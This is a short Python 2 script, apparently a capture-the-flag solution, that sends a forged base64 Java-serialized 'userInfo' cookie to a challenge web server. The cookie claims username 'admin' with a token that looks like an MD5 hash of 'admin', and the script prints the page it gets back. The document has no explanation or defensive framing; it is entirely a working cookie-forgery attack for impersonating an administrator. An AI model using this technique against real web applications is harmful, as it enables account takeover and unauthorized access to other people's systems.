import requests

url = 'https://extramile.web.cyber.jawara.systems/'
conn = requests.Session()
payload = """r0ABXNyAA9XRUJDVEYuVXNlckluZm8AAAAAAAAAAQIAAkwABXRva2VudAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdXNlcm5hbWVxAH4AAXhwdAAgMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzN0AAVhZG1pbg=="""
cookies = {"JSESSIONID": "01EC678A9553AA851276D90CF281F9A2", "userInfo": payload}

hiya = conn.get(url, cookies = cookies)
print hiya.text